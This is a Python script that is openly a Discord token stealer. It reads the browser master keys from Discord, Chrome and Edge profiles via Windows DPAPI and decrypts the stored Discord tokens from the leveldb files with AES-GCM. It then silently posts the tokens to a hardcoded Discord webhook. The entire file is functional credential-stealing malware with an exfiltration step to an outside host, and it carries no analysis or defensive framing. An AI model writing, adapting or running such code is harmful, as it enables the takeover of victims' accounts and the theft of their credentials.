import os
import re
import json
import base64
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import win32crypt

WEBHOOK = "https://discord.com/api/webhooks/1568251360334323824/NgfECvorAQezFSj25M-1QPB7GW5LHO46NuM6ZAlzkNPR4EaFBK7GK2QsU7n-FAnHNfhX"
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Chrome": LOCAL + "\\Google\\Chrome\\User Data",
    "Edge": LOCAL + "\\Microsoft\\Edge\\User Data"
}

def get_key(path):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path): return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = local_state.get("os_crypt", {}).get("encrypted_key")
    if not key: return None
    key = base64.b64decode(key)[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return None

def steal_tokens():
    found_tokens = []
    for name, path in PATHS.items():
        if not os.path.exists(path): continue
        key = get_key(path)
        if not key: continue
        
        ls_path = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(ls_path):
            for file_name in os.listdir(ls_path):
                if file_name.endswith(".ldb") or file_name.endswith(".log"):
                    with open(os.path.join(ls_path, file_name), "r", errors="ignore") as f:
                        content = f.read()
                        # Simpler token extraction to avoid regex syntax errors
                        parts = content.split("dQw4w9WgXcQ:")
                        for part in parts[1:]:
                            token_str = part.split('"')[0].split("\\")[0]
                            try:
                                decrypted = decrypt_val(base64.b64decode(token_str), key)
                                if decrypted and len(decrypted) > 50: 
                                    found_tokens.append(f"[{name}] {decrypted}")
                            except: pass
    return list(set(found_tokens))

def send(tokens):
    if not tokens: return
    data = "\n".join(tokens)
    payload = {
        "content": f"**Tokens Found!**\n```\n{data}\n```"
    }
    requests.post(WEBHOOK, json=payload)

if __name__ == "__main__":
    try:
        tokens = steal_tokens()
        send(tokens)
    except Exception:
        pass
        
